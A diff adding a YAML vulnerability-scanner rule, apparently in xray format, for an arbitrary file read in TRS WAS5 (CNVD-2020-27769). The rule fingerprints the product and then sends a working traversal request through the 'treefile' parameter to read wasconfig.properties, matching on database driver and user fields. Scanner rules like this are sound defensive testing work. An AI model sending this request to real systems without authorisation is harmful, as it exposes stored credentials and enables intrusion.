@@ -1,0 +1,24 @@
+name: yaml-poc-trs-trs_was5-readfile-CNVD-2020-27769
+binding: e9318124-2adc-4f01-8212-ad03de878d22
+detail:
+    author: system_user
+    links:
+        - https://www.cnvd.org.cn/flaw/show/CNVD-2020-27769
+    vulnerability:
+        id: a0ea9736-16fb-4f7a-a505-67cef696a9d8
+        level: medium
+transport: http
+rules:
+    detect:
+        request:
+            cache: true
+            method: GET
+            path: /was5/web
+        expression: response.status == 200 && response.body.bcontains(b"/was5/admin/images")
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /was5/web/tree?treefile=/WEB-INF/classes/com/trs/was/resource/wasconfig.properties
+        expression: response.status == 200 && response.body.bcontains(b"sysdriver") && response.body.bcontains(b"sysuser")
+expression: detect() && r0()
